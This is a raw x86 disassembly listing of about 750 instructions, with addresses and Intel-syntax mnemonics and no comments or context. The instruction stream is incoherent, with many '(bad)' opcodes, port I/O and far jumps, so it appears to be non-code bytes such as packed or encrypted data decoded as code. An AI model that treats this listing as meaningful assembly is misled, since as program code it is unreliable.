  418065:	pushw  0xe712
  418069:	in     eax,dx
  41806a:	ror    DWORD PTR [ebp-0x5f],1
  41806d:	pop    ecx
  41806e:	inc    ebp
  41806f:	jmp    0xff257018
  418074:	push   es
  418075:	icebp  
  418076:	lock aad 0x20
  418079:	jns    0x41809a
  41807b:	stos   BYTE PTR es:[edi],al
  41807c:	mov    dl,0xec
  41807e:	sbb    dh,cl
  418080:	xor    edi,DWORD PTR [ecx+0x1da5972d]
  418086:	xor    esi,DWORD PTR [eax+0x46]
  418089:	sub    DWORD PTR [ebp+0x3b],esp
  41808c:	fs pop es
  41808e:	dec    eax
  41808f:	and    al,0xb2
  418091:	fdiv   QWORD PTR [eax+0x7ae5b271]
  418097:	and    eax,0x1259acec
  41809c:	mov    BYTE PTR [eax+0x0],al
  41809f:	pop    ds
  4180a0:	add    ah,ch
  4180a2:	int3   
  4180a3:	and    eax,0x8758ce7b
  4180a8:	jns    0x4180ba
  4180aa:	fs mov esp,0x5ed982c6
  4180b1:	mov    ds:0x6fb56d4,al
  4180b6:	push   edi
  4180b7:	sti    
  4180b8:	mul    DWORD PTR [edx+0x6c]
  4180bb:	xor    edi,edi
  4180bd:	adc    dh,ch
  4180bf:	js     0x41805e
  4180c1:	pop    ss
  4180c2:	ret    0xd4a1
  4180c5:	sbb    eax,0x8ddf3945
  4180ca:	xchg   ebx,eax
  4180cb:	bound  edi,QWORD PTR [ebx+0x28]
  4180ce:	pop    ds
  4180cf:	add    bh,dh
  4180d1:	pop    esp
  4180d2:	jno    0x418124
  4180d4:	jns    0x418125
  4180d6:	adc    eax,ecx
  4180d8:	addr16 sub al,0x44
  4180db:	adc    dl,BYTE PTR [esi]
  4180dd:	inc    ebx
  4180de:	xchg   esp,eax
  4180df:	pop    esi
  4180e0:	jg     0x4180b5
  4180e2:	sbb    dl,BYTE PTR [esi+0x25]
  4180e5:	imul   ebx,DWORD PTR [eax],0x44
  4180e8:	sbb    al,0xc6
  4180ea:	push   edx
  4180eb:	pop    es
  4180ec:	loope  0x418149
  4180ee:	adc    DWORD PTR [eax+0x2b],edi
  4180f1:	pop    edx
  4180f2:	loopne 0x418125
  4180f4:	sbb    DWORD PTR [eax],ebp
  4180f6:	cwde   
  4180f7:	(bad)  
  4180f8:	xor    eax,0x8b06e844
  4180fd:	push   edx
  4180fe:	fisubr WORD PTR [ecx]
  418100:	mov    edi,0x41d467ca
  418105:	test   DWORD PTR [ebx-0x43],edx
  418108:	in     al,dx
  418109:	scas   eax,DWORD PTR es:[edi]
  41810a:	xchg   ebp,eax
  41810b:	out    dx,al
  41810c:	mov    bh,0xb6
  41810e:	dec    esp
  41810f:	(bad)  
  418111:	mov    al,0xbf
  418113:	and    eax,0x3fcf276
  418118:	dec    BYTE PTR [eax+ebp*8-0x68]
  41811c:	in     eax,0x17
  41811e:	sub    DWORD PTR ds:0xa952599b,esi
  418124:	jnp    0x41816b
  418126:	retf   
  418127:	inc    esi
  418128:	aas    
  418129:	xchg   DWORD PTR [eax+0x3b52d56d],ecx
  41812f:	or     eax,0x62f6908c
  418134:	mov    dl,0xfd
  418136:	stc    
  418137:	aam    0xb5
  418139:	loopne 0x418103
  41813b:	addr16 mov al,0x52
  41813e:	sub    al,0x7c
  418140:	pop    edx
  418141:	inc    ebx
  418142:	xlat   BYTE PTR ds:[ebx]
  418143:	jbe    0x41813c
  418145:	push   edi
  418146:	mov    ch,0xb8
  418148:	out    dx,eax
  418149:	sub    DWORD PTR [eax+0x65],ebx
  41814c:	retf   
  41814d:	stos   DWORD PTR es:[edi],eax
  41814e:	mov    ds:0xf55e7b4d,eax
  418153:	xor    ebx,ebx
  418155:	xchg   ecx,eax
  418156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418157:	fistp  QWORD PTR [ecx+0x1052d58a]
  41815d:	popa   
  41815e:	sahf   
  41815f:	xor    edx,DWORD PTR [ecx+0x1c426943]
  418165:	jb     0x418199
  418167:	inc    ebp
  418168:	cwde   
  418169:	push   di
  41816b:	and    BYTE PTR [esi+0x1e1dbc30],bh
  418171:	mov    ?,WORD PTR [ecx]
  418173:	and    edi,edx
  418175:	(bad)  
  418176:	in     al,dx
  418177:	gs inc edx
  418179:	jle    0x41818a
  41817b:	scas   al,BYTE PTR es:[edi]
  41817c:	adc    ebp,DWORD PTR [eax+0x4c]
  41817f:	in     al,dx
  418180:	cmp    eax,0xe518b082
  418185:	adc    cl,BYTE PTR [ebx-0x50]
  418188:	ins    BYTE PTR es:[edi],dx
  418189:	jmp    0x41815a
  41818b:	in     eax,dx
  41818c:	push   ss
  41818d:	mov    esp,0x8b503256
  418192:	add    BYTE PTR [edi-0x13],cl
  418195:	stos   BYTE PTR es:[edi],al
  418196:	add    ecx,DWORD PTR [esi]
  418198:	pop    es
  418199:	enter  0xf119,0x4
  41819d:	stos   BYTE PTR es:[edi],al
  41819e:	or     dl,dh
  4181a0:	jp     0x418127
  4181a2:	cmc    
  4181a3:	aas    
  4181a4:	std    
  4181a5:	out    0x64,eax
  4181a7:	mov    ecx,0xb414e057
  4181ac:	scas   eax,DWORD PTR es:[edi]
  4181ad:	inc    ecx
  4181ae:	repz and BYTE PTR [ebx-0x3ab98401],dh
  4181b5:	cmp    ebx,DWORD PTR [edx+0x4d]
  4181b8:	jp     0x4181b0
  4181ba:	cmp    ecx,ebp
  4181bc:	dec    ebp
  4181bd:	mov    bh,BYTE PTR ss:[esi]
  4181c0:	test   DWORD PTR [esi+0xcd993ee],ebx
  4181c6:	sbb    BYTE PTR [esi+0x24],ah
  4181c9:	shl    DWORD PTR [edi+0x3868e086],1
  4181cf:	stos   BYTE PTR es:[edi],al
  4181d0:	test   al,0xcd
  4181d2:	int3   
  4181d3:	lahf   
  4181d4:	xchg   ah,bl
  4181d6:	or     BYTE PTR [esi],dl
  4181d8:	lahf   
  4181d9:	xchg   ebx,eax
  4181da:	cli    
  4181db:	dec    ecx
  4181dc:	push   ds
  4181dd:	dec    ebp
  4181de:	mov    eax,ds:0x92152291
  4181e3:	ror    DWORD PTR [edx+0x4e],1
  4181e6:	imul   edx,DWORD PTR [ecx-0x47d17eb5],0x72
  4181ed:	push   edi
  4181ee:	jnp    0x4181c7
  4181f0:	xlat   BYTE PTR ds:[ebx]
  4181f1:	lahf   
  4181f2:	es mov edx,0xbd325aa5
  4181f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181f9:	dec    ecx
  4181fa:	mov    BYTE PTR [edx],ah
  4181fc:	xchg   edi,eax
  4181fd:	or     BYTE PTR [edx+0x3],al
  418200:	mov    edx,0x3dc6b3c0
  418205:	call   0x75f34ce9
  41820a:	lock cmp BYTE PTR [edi+0x7df72eba],bl
  418211:	sbb    al,0x2
  418213:	scas   al,BYTE PTR es:[edi]
  418214:	xchg   ebx,eax
  418215:	out    dx,al
  418216:	cdq    
  418217:	push   edi
  418218:	xchg   esi,eax
  418219:	add    al,BYTE PTR ds:0x84e14565
  41821f:	mov    DWORD PTR [esi],esp
  418221:	inc    ebx
  418222:	(bad)  
  418223:	sub    esp,eax
  418225:	vmread DWORD PTR [eax+0x6e],ebp
  418229:	mov    ah,0x65
  41822b:	rcl    BYTE PTR [ebp+0x31],0x54
  41822f:	xchg   DWORD PTR [edx+0x61],esi
  418232:	fs icebp 
  418234:	cmp    al,0x1b
  418236:	inc    ebp
  418237:	mov    edi,0x11abc31a
  41823c:	idiv   DWORD PTR fs:[ecx+0x5d]
  418240:	add    DWORD PTR [edx+0x76316111],edx
  418246:	and    dl,al
  418248:	rcl    BYTE PTR [esi-0x114999bb],cl
  41824e:	and    eax,0x716a383b
  418253:	mov    ebx,0x6a4f4ee4
  418258:	out    0x7b,eax
  41825a:	sbb    edi,edx
  41825c:	inc    edi
  41825d:	pusha  
  41825e:	add    BYTE PTR [ebx-0x54],ah
  418261:	mov    edx,0x84dec790
  418266:	mov    edx,0x6d8f9de
  41826b:	inc    ebx
  41826c:	add    BYTE PTR [edx+0x2c],al
  41826f:	imul   edi,DWORD PTR [ebx-0x1688f4a1],0xffffff88
  418276:	dec    edi
  418277:	xchg   ebp,eax
  418278:	es sbb bh,ah
  41827b:	jge    0x4182e3
  41827d:	fwait
  41827e:	fwait
  41827f:	jg     0x4182b8
  418281:	pop    eax
  418282:	in     al,dx
  418283:	popf   
  418284:	xchg   esi,eax
  418285:	push   esp
  418286:	(bad)  
  418287:	neg    BYTE PTR [ebx+0x177d9fba]
  41828d:	rcl    BYTE PTR [ebp+edi*8+0x6fdee1fc],0xe5
  418295:	(bad)
  418299:	lds    eax,FWORD PTR [edx-0x1c]
  41829c:	push   edx
  41829d:	es (bad) 
  4182a0:	push   ecx
  4182a1:	and    dl,bh
  4182a3:	and    dl,dl
  4182a5:	xchg   ecx,eax
  4182a6:	push   esp
  4182a7:	pusha  
  4182a8:	jle    0x4182ac
  4182aa:	mov    es,WORD PTR cs:[ebx+edx*4]
  4182ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182af:	xchg   BYTE PTR [eax-0x18b35872],ah
  4182b5:	jg     0x41823f
  4182b7:	jno    0x4182f2
  4182b9:	pop    ecx
  4182ba:	in     eax,dx
  4182bb:	xor    DWORD PTR [ebx],esi
  4182bd:	add    ebx,edi
  4182bf:	es sub eax,0x856c4fa9
  4182c5:	dec    esi
  4182c6:	arpl   WORD PTR [edx-0x66328b98],dx
  4182cc:	inc    edx
  4182cd:	enter  0xa810,0x37
  4182d1:	jbe    0x41825e
  4182d3:	fsubp  st(5),st
  4182d5:	sub    DWORD PTR [ecx+0x39d5e0c2],ebp
  4182db:	sbb    dl,bl
  4182dd:	mov    ch,0x10
  4182df:	hlt    
  4182e0:	ja     0x4182e1
  4182e2:	sbb    al,0x2
  4182e4:	test   ch,ch
  4182e6:	xor    bl,BYTE PTR [edi+esi*2]
  4182e9:	into   
  4182ea:	push   esi
  4182eb:	fsub   QWORD PTR [esi]
  4182ed:	mov    ecx,0x797b07ed
  4182f2:	jmp    0xb1d51861
  4182f7:	mov    ebp,0x56de3914
  4182fc:	cmp    eax,0xc6b4834f
  418301:	and    ah,bh
  418303:	pop    esp
  418304:	push   ss
  418305:	jae    0x418330
  418307:	push   0x34
  418309:	cmp    edi,ebx
  41830b:	mov    WORD PTR [edx-0x3511dd94],ss
  418311:	cmc    
  418312:	loop   0x4182b6
  418314:	stc    
  418315:	gs jl  0x4182cf
  418318:	fist   WORD PTR [ebx-0xf2d4062]
  41831e:	dec    ebx
  41831f:	cmp    dh,BYTE PTR [edx]
  418321:	xor    eax,0x876c1dd3
  418326:	sahf   
  418327:	stos   DWORD PTR es:[edi],eax
  418328:	add    eax,DWORD PTR [edx-0x2beed472]
  41832e:	or     cl,cl
  418330:	dec    esp
  418331:	ret    0xc4da
  418334:	xchg   BYTE PTR [esi-0x6bdacfc7],bh
  41833a:	shl    edx,cl
  41833c:	or     al,0xad
  41833e:	mov    ch,0x6f
  418340:	out    dx,eax
  418341:	add    DWORD PTR [edi],ebx
  418343:	jnp    0x41833a
  418345:	in     eax,0xf0
  418347:	jb     0x418361
  418349:	dec    edi
  41834a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41834b:	hlt    
  41834c:	outs   dx,DWORD PTR ds:[esi]
  41834d:	or     DWORD PTR [edi+0x7c],ebp
  418350:	aas    
  418351:	inc    ebx
  418352:	sub    BYTE PTR [edi-0x35],dl
  418355:	xchg   ebx,eax
  418356:	pop    esi
  418357:	xor    eax,0x3f9e66dc
  41835c:	test   al,0x7f
  41835e:	outs   dx,BYTE PTR ds:[esi]
  41835f:	sbb    al,0x70
  418361:	pushf  
  418362:	enter  0x225f,0x2
  418366:	(bad)  
  418367:	cmp    eax,0xa1351c6b
  41836c:	pop    ds
  41836d:	add    eax,0x756b9d53
  418372:	ss jmp 0xdc936488
  418378:	lds    edx,FWORD PTR [esp+ebx*8+0x75a58741]
  41837f:	sub    bh,bh
  418381:	fiadd  WORD PTR [ebx-0x40]
  418384:	loop   0x4183cb
  418386:	dec    esp
  418387:	pop    ecx
  418388:	or     al,BYTE PTR [edi]
  41838a:	cmp    BYTE PTR [edi-0x3630f281],0x70
  418391:	xor    DWORD PTR [ebx+0x4c],edi
  418394:	inc    edx
  418395:	inc    ebp
  418396:	imul   eax,DWORD PTR [ebx+0x27839145],0x5
  41839d:	xchg   esp,eax
  41839e:	cmp    ecx,eax
  4183a0:	or     DWORD PTR [bx+di-0x5],ebp
  4183a4:	stos   BYTE PTR es:[edi],al
  4183a5:	inc    ecx
  4183a6:	inc    esi
  4183a7:	add    al,0xb1
  4183a9:	scas   al,BYTE PTR es:[edi]
  4183aa:	add    al,0xed
  4183ac:	lea    eax,[esi+0x3bbf66c1]
  4183b2:	cdq    
  4183b3:	add    ebp,DWORD PTR [ebx+0x6b6ddc79]
  4183b9:	fidiv  WORD PTR [edx+eiz*8-0x69ce1dd6]
  4183c0:	(bad)  
  4183c2:	mov    DWORD PTR [ecx-0x13],edx
  4183c5:	sti    
  4183c6:	push   ecx
  4183c7:	push   ebx
  4183c8:	mov    esp,0x167f763d
  4183cd:	pop    esp
  4183ce:	popf   
  4183cf:	xchg   ebp,eax
  4183d0:	cli    
  4183d1:	inc    edx
  4183d2:	add    DWORD PTR [ecx+0x172c10d8],ebp
  4183d8:	sti    
  4183d9:	pop    esi
  4183da:	dec    ecx
  4183db:	mov    ecx,DWORD PTR [ebp+0x55d65ff9]
  4183e1:	jmp    0xa5f812b2
  4183e6:	xchg   ecx,eax
  4183e7:	fisttp QWORD PTR [esi]
  4183e9:	(bad)  [edi-0x31]
  4183ec:	jmp    0x59ef6b35
  4183f1:	scas   al,BYTE PTR es:[edi]
  4183f2:	aam    0x79
  4183f4:	fistp  WORD PTR [edi]
  4183f6:	xchg   bx,ax
  4183f8:	lods   al,BYTE PTR ds:[esi]
  4183f9:	rcr    DWORD PTR [ebp+esi*4+0x7f20335],0x3d
  418401:	inc    ecx
  418402:	fld    QWORD PTR [edi+0x296faf2e]
  418408:	inc    edx
  418409:	sar    DWORD PTR [edi+0x79],1
  41840c:	jmp    0x16bf:0x5ae7ac3e
  418413:	js     0x418399
  418415:	sub    DWORD PTR [ebp-0x69],eax
  418418:	jge    0x4183ab
  41841a:	cdq    
  41841b:	leave  
  41841c:	(bad)  
  41841d:	lods   eax,DWORD PTR ds:[esi]
  41841e:	test   eax,0xf5beef03
  418423:	xchg   BYTE PTR [edx],bh
  418425:	lods   al,BYTE PTR ds:[esi]
  418426:	inc    ebx
  418427:	sbb    bl,0x71
  41842a:	mov    bl,0x9f
  41842c:	xor    dh,BYTE PTR [ebx]
  41842e:	int    0x6d
  418430:	adc    BYTE PTR [edi+ebp*2+0x5d4018cd],ch
  418437:	add    DWORD PTR [ebx-0x1d],eax
  41843a:	mov    al,0x64
  41843c:	data16 js 0x418439
  41843f:	dec    esp
  418440:	jne    0x41843b
  418442:	bound  esi,QWORD PTR [esi+0x266d6d9d]
  418448:	dec    esp
  418449:	xor    al,0xc3
  41844b:	call   0x7eb5ba39
  418450:	(bad)  [edx+edx*2+0x5a014478]
  418457:	outs   dx,BYTE PTR ds:[esi]
  418458:	xor    DWORD PTR [ebp+0x39],edi
  41845b:	sahf   
  41845c:	mov    edx,0x62e2e12d
  418461:	jae    0x4183f5
  418463:	push   ecx
  418464:	xchg   esp,eax
  418465:	push   edi
  418466:	xor    DWORD PTR [esi-0x65],ebx
  418469:	mov    ecx,ss
  41846b:	or     dl,cl
  41846d:	gs imul eax,esi,0xe83ab8d2
  418474:	pop    edx
  418475:	dec    ebx
  418476:	sub    ebx,DWORD PTR [ecx+0x79]
  418479:	sub    al,0x44
  41847b:	shl    al,0xe7
  41847e:	mov    bh,0x72
  418480:	sbb    bh,dh
  418482:	jmp    0xfab3:0x5010e4c5
  418489:	ins    DWORD PTR es:[edi],dx
  41848a:	jp     0x41850b
  41848c:	in     al,0x43
  41848e:	xor    DWORD PTR [ebx+0x1bea0b5a],edi
  418494:	cmc    
  418495:	retf   
  418496:	icebp  
  418497:	jmp    0x6cd1:0x262e75cd
  41849e:	rcl    DWORD PTR [edx+eax*2],cl
  4184a1:	pop    es
  4184a2:	(bad)  
  4184a3:	jmp    0x31070286
  4184a8:	xor    bl,dl
  4184aa:	jle    0x41847e
  4184ac:	retf   
  4184ad:	mov    ebx,DWORD PTR ds:0x661a1461
  4184b3:	xchg   ecx,eax
  4184b4:	and    BYTE PTR [ebx-0x3f145e46],bh
  4184ba:	aad    0x56
  4184bc:	push   esi
  4184bd:	fldenv [ecx+0xd]
  4184c0:	jecxz  0x418500
  4184c2:	mov    edi,ebx
  4184c4:	mov    al,0xb1
  4184c6:	jl     0x418496
  4184c8:	cld    
  4184c9:	imul   esi,DWORD PTR [esi-0x55],0x320ed7e2
  4184d0:	jmp    0x418500
  4184d2:	imul   ecx,esp,0xffffffcf
  4184d5:	push   ecx
  4184d6:	ret    0xf939
  4184d9:	cmc    
  4184da:	push   es
  4184db:	arpl   WORD PTR [eax+0x59],sp
  4184de:	mov    ebp,0x1819daa1
  4184e3:	in     al,dx
  4184e4:	pop    esi
  4184e5:	pop    edi
  4184e6:	xlat   BYTE PTR ds:[ebx]
  4184e7:	icebp  
  4184e8:	pop    ds
  4184e9:	mov    ds:0x1e91e725,al
  4184ee:	jl     0x418529
  4184f0:	or     DWORD PTR [eax+0x66],ebx
  4184f3:	adc    eax,0x13e53b04
  4184f8:	cmp    al,0x61
  4184fa:	adc    ebx,DWORD PTR [ebp+0x771d1fb6]
  418500:	out    dx,al
  418501:	imul   ebp,ebp,0x2db66adb
  418507:	out    0xaf,al
  418509:	or     ebx,DWORD PTR [esi]
  41850b:	sub    eax,0xdcf05d92
  418510:	lds    ebx,FWORD PTR [ebp+0x1c]
  418513:	ret    
  418514:	mov    ds:0xaafa7306,al
  418519:	test   eax,0xd6a0683a
  41851e:	adc    DWORD PTR [edi+0x3fcf2540],0xfffffff0
  418525:	mov    cl,0xbc
  418527:	xlat   BYTE PTR ds:[ebx]
  418528:	shl    BYTE PTR [esi],1
  41852a:	mov    edi,cs
  41852c:	pand   mm4,QWORD PTR [esi+0xb]
  418530:	das    
  418531:	mov    edx,0xbb5adf27
  418536:	xchg   BYTE PTR [edi-0x6ceffdc0],bh
  41853c:	repz fs fwait
  41853f:	shr    DWORD PTR [edx+esi*8-0x7ab4d698],1
  418546:	fisttp QWORD PTR [eax-0x11c349f2]
  41854c:	jne    0x4184d7
  41854e:	out    0x1e,al
  418550:	push   esi
  418551:	dec    edi
  418552:	dec    edi
  418553:	xor    bh,BYTE PTR [esi+0x5f5a456e]
  418559:	fstp   st(3)
  41855b:	and    al,0x7d
  41855d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41855e:	sahf   
  41855f:	rcl    BYTE PTR [eax-0x6e846f0f],0x57
  418566:	sub    DWORD PTR [ecx-0x4e707aca],esi
  41856c:	mov    ds:0xc1953d98,eax
  418571:	pop    ss
  418572:	add    ebx,ebx
  418574:	div    al
  418576:	jg     0x418518
  418578:	sbb    al,0xb2
  41857a:	mov    dh,0x9d
  41857c:	pop    ebp
  41857d:	sub    BYTE PTR [edx],cl
  41857f:	mov    esi,0x1cad644a
  418584:	sahf   
  418585:	mov    dl,0xd0
  418587:	add    al,0x9c
  418589:	mov    ebx,0xb17ed63
  41858e:	repnz dec ebx
  418590:	cmp    al,0xb6
  418592:	cmp    ah,BYTE PTR [edi+0x5b9cf80b]
  418598:	mov    esp,0xc7715507
  41859d:	mov    al,0xa9
  41859f:	daa    
  4185a0:	cmp    al,ah
  4185a2:	push   edx
  4185a3:	and    DWORD PTR [ebx],ecx
  4185a5:	cmp    BYTE PTR [ecx+esi*1-0x51],dh
  4185a9:	outs   dx,BYTE PTR es:[esi]
  4185ab:	cmp    bh,BYTE PTR [ebx]
  4185ad:	imul   ebx,edi,0xffffffe8
  4185b0:	psubb  mm2,mm1
  4185b3:	inc    ebx
  4185b4:	adc    ebp,DWORD PTR [eax+ebp*1-0x2d5190a6]
  4185bb:	sbb    eax,0xd8301841
  4185c0:	sub    eax,0x30e8a3f3
  4185c5:	outs   dx,BYTE PTR ds:[esi]
  4185c6:	aaa    
  4185c7:	pushf  
  4185c8:	mov    edi,DWORD PTR [eax-0xe9996a7]
  4185ce:	pop    ss
  4185cf:	inc    ecx
  4185d0:	jg     0x4185eb
  4185d2:	aaa    
  4185d3:	add    dh,dl
  4185d5:	mov    al,0x96
  4185d7:	pop    eax
  4185d8:	sbb    al,0x2b
  4185da:	jmp    0x4185ce
  4185dc:	mov    bl,0x91
  4185de:	mov    cl,ch
  4185e0:	xchg   ebx,eax
  4185e1:	dec    ebp
  4185e2:	push   ss
  4185e3:	and    esp,DWORD PTR [eax]
  4185e5:	xor    eax,0x5a09eec2
  4185ea:	call   0x2ad1:0x2c0cab81
  4185f1:	enter  0x4c0b,0x76
  4185f5:	rol    DWORD PTR [ebp+0x39],cl
  4185f8:	rcl    BYTE PTR [ebp+ebx*4+0x2a],1
  4185fc:	mov    ebp,0x5f33f558
  418601:	add    dh,BYTE PTR [esp+esi*8]
  418604:	pop    ebp
  418605:	mov    al,ds:0x4dbc2c16
  41860a:	sbb    BYTE PTR [ebx],0x54
  41860d:	xchg   esp,eax
  41860e:	inc    eax
  41860f:	and    al,0x3d
  418611:	mov    dh,0xfd
  418613:	pop    ss
  418614:	out    0x68,eax
  418616:	push   ss
  418617:	jmp    0xbab4:0x2bb5bcc4
  41861e:	fisub  WORD PTR [ebp+edi*4-0x16f0a40b]
  418625:	fst    QWORD PTR [ebx]
  418627:	in     eax,dx
  418628:	jle    0x4185e1
  41862a:	xchg   edx,eax
  41862b:	add    al,0x4b
  41862d:	(bad)  
  41862f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418630:	repz lea eax,[esi]
  418633:	retf   0x7b03
  418636:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418637:	ja     0x418617
  418639:	mov    edx,0x4bef31de
  41863e:	out    dx,al
  41863f:	jmp    0x4185ca
  418641:	mov    dh,0x7e
  418643:	rol    BYTE PTR [ecx],0x84
  418646:	sar    BYTE PTR [edi+0x2],1
  418649:	imul   eax,DWORD PTR [edx+ebx*1-0x2d],0xffffff87
  41864e:	(bad)  
  41864f:	cmc    
  418650:	mov    ch,0xfa
  418652:	adc    BYTE PTR [ebx],bh
  418654:	pop    edi
  418655:	aad    0xc7
  418657:	mov    ss,WORD PTR [ecx-0x35]
  41865a:	int3   
  41865b:	bound  edi,QWORD PTR [edx]
  41865d:	shr    al,1
  41865f:	mov    eax,ds:0xc611f1b1
  418664:	xchg   esp,eax
  418665:	xor    BYTE PTR [eax],cl
  418667:	pop    esi
  418668:	jmp    0xfce8f483
  41866d:	loop   0x4186cc
  41866f:	jp     0x4186dd
  418671:	pushf  
  418672:	loopne 0x41863d
  418674:	sbb    BYTE PTR [edx+0xa],cl
  418677:	add    BYTE PTR [edx+esi*2],cl
  41867a:	and    ax,0x926d
  41867e:	rcr    BYTE PTR [ebx],1
  418680:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418681:	add    al,0xc8
  418683:	xchg   ecx,eax
  418684:	xor    BYTE PTR [ecx+esi*1],ah
  418687:	icebp  
  418688:	or     bl,BYTE PTR [edi+0x74]
  41868b:	js     0x4186c4
  41868d:	mov    ah,0x3
  41868f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418690:	sub    al,0x21
  418692:	push   0xe0be1b31
  418697:	std    
  418698:	test   DWORD PTR [ebx],ebx
  41869a:	xchg   ebp,eax
  41869b:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41869d:	xchg   ecx,eax
  41869e:	(bad)  
  41869f:	and    bl,bl
  4186a1:	adc    DWORD PTR [edx-0x18aa9df6],eax
  4186a7:	aaa    
  4186a8:	popf   
  4186a9:	cli    
  4186aa:	nop
  4186ab:	mov    dl,0x2b
  4186ad:	mov    dh,0x7e
  4186af:	adc    eax,0x8f7f2f9
  4186b4:	pop    esp
  4186b5:	sbb    al,BYTE PTR [esi-0x1b]
  4186b8:	out    0xb2,al
  4186ba:	mov    ds:0x47d866e4,eax
  4186bf:	and    eax,0x30683ca4
  4186c4:	and    edi,DWORD PTR [edx-0x76]
  4186c7:	cmc    
  4186c8:	push   0x48
  4186ca:	or     dh,cl
  4186cc:	sub    dh,BYTE PTR [ecx+0x893d7f]
  4186d2:	aam    0xea
  4186d4:	add    edi,ebx
  4186d6:	mov    DWORD PTR [ebx-0x14ef4da4],eax
  4186dc:	sbb    DWORD PTR [edi],0x173dfa4e
  4186e2:	fadd   st,st(1)
  4186e4:	fistp  WORD PTR [edi]
  4186e6:	ja     0x418736
  4186e8:	push   ebp
  4186e9:	and    eax,0x8bfa00b3
  4186ee:	push   esi
  4186ef:	mov    ecx,0x1c2aaedd
  4186f4:	mov    al,0x29
  4186f6:	push   es
  4186f7:	mov    cl,0x73
  4186f9:	(bad)  
  4186fa:	mov    BYTE PTR [edx+0x28],al
  4186fd:	or     eax,0x7c77b375
  418702:	test   al,0x8e
  418704:	lahf   
  418705:	ret    0x825b
  418708:	icebp  
  418709:	leave  
  41870a:	sub    eax,0x56f6bcac
  41870f:	enter  0x6852,0x7d
  418713:	mov    ah,0xe0
  418715:	mov    eax,?
  418717:	sbb    bh,0x7b
  41871a:	mov    WORD PTR [edi],?
  41871c:	repnz (bad) 
  41871e:	std    
  41871f:	jne    0x418708
  418721:	sbb    esp,DWORD PTR [eax-0x13]
  418724:	cdq    
  418725:	mov    al,0x17
  418727:	xchg   BYTE PTR [ecx-0x39ecd26c],al
  41872d:	sbb    eax,0x63e70695
  418732:	inc    ecx
  418733:	dec    esp
  418734:	ins    BYTE PTR es:[edi],dx
  418735:	ds push ecx
  418737:	arpl   WORD PTR [ebp+0x392e66af],bp
  41873d:	sbb    al,0xb5
  41873f:	sub    cl,BYTE PTR ds:0x3382ff15
  418745:	mov    al,0x21
  418747:	leave  
  418748:	stos   BYTE PTR es:[edi],al
  418749:	and    ecx,DWORD PTR [esi]
  41874b:	retf   0x9d48
  41874e:	cmc    
  41874f:	enter  0x6012,0xf
  418753:	popf   
  418754:	arpl   dx,bp
  418756:	rol    DWORD PTR [ebx],0x3c
  418759:	inc    ebp
  41875a:	les    ecx,FWORD PTR [esi+0x65]
  41875d:	mov    ah,0xaa
  41875f:	mov    edx,0x592e0501
  418764:	mov    esi,0xc4e51679
  418769:	mov    WORD PTR [ecx*8+0x44677fb6],ds
  418770:	ret    0xc6dd
  418773:	jl     0x4187c3
  418775:	loopne 0x4187c8
  418777:	sbb    esp,edx
  418779:	and    edi,edx
  41877b:	or     bh,BYTE PTR [ebx]
  41877d:	xchg   ebp,eax
  41877e:	mov    BYTE PTR [ebp+0x77],bl
  418781:	adc    esi,DWORD PTR [eax-0x74]
  418784:	test   eax,0x7b44fddd
  418789:	nop
  41878a:	in     al,0x67
  41878c:	sbb    BYTE PTR [esi+ebp*1+0x65d95cb1],bl
  418793:	mov    es,esp
  418795:	sub    al,BYTE PTR [ecx+0x38]
  418798:	stc    
  418799:	push   edi
  41879a:	std    
  41879b:	inc    edi
  41879c:	pop    ds
  41879d:	pusha  
  41879e:	xchg   DWORD PTR cs:[edi-0x69],edi
  4187a2:	stos   DWORD PTR es:[edi],eax
  4187a3:	fs scas eax,DWORD PTR es:[edi]
  4187a5:	(bad)  [ecx+0x56b5b6e9]
  4187ab:	inc    ebx
  4187ac:	jno    0x41878d
  4187ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187af:	daa    
  4187b0:	jne    0x4187a7
  4187b2:	jae    0x41874a
  4187b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187b5:	adc    esp,esi
  4187b7:	outs   dx,DWORD PTR ds:[esi]
  4187b8:	or     BYTE PTR [ebx+0x5a],dl
  4187bb:	or     BYTE PTR ds:0x85e05d8b,bl
  4187c1:	enter  0x6b3,0x5f
  4187c5:	sub    DWORD PTR [eax],ecx
  4187c7:	je     0x4187e6
  4187c9:	jb     0x4187ed
  4187cb:	mov    edx,0x8920a5df
  4187d0:	leave  
  4187d1:	xchg   BYTE PTR [ebx+0x7be5ff9d],al
  4187d7:	sbb    ebx,DWORD PTR [ecx+0x58]
  4187da:	or     eax,0x59ada97f
  4187df:	fadd   DWORD PTR ds:0x1f024b27
  4187e5:	inc    esi
  4187e6:	lods   al,BYTE PTR ds:[esi]
  4187e7:	mov    al,ds:0x59a4b7e5
  4187ec:	or     BYTE PTR [esi-0x19157dc9],0xc0
  4187f3:	cmp    BYTE PTR [esi+0x132e14b0],ch
  4187f9:	or     DWORD PTR [ecx],ebp
  4187fb:	mov    bl,0x96
  4187fd:	pop    ecx
  4187fe:	xchg   esp,eax
  4187ff:	mov    WORD PTR [ebp+ecx*8+0x47b77b5b],?
  418806:	lahf   
  418807:	jnp    0x418875
  418809:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41880a:	mov    edi,0xe86ca288
  41880f:	sbb    al,0x96
  418811:	lods   eax,DWORD PTR ds:[esi]
  418812:	and    DWORD PTR [eax-0x6a5d39c6],ecx
  418818:	mov    al,ds:0x716105f2
  41881d:	pop    esi
  41881e:	sahf   
  41881f:	(bad)  
  418820:	dec    ebx
  418821:	gs pop ebx
  418823:	mov    eax,0xd2457e6a
  418828:	(bad)  
  41882a:	push   ds
  41882b:	sub    al,0xbf
  41882d:	pop    eax
  41882e:	test   eax,0xdb57f2f
  418833:	jbe    0x4187ea
  418835:	jb     0x418824
  418837:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418839:	mov    esp,0x631d1417
  41883e:	mov    ecx,0x1f1c957d
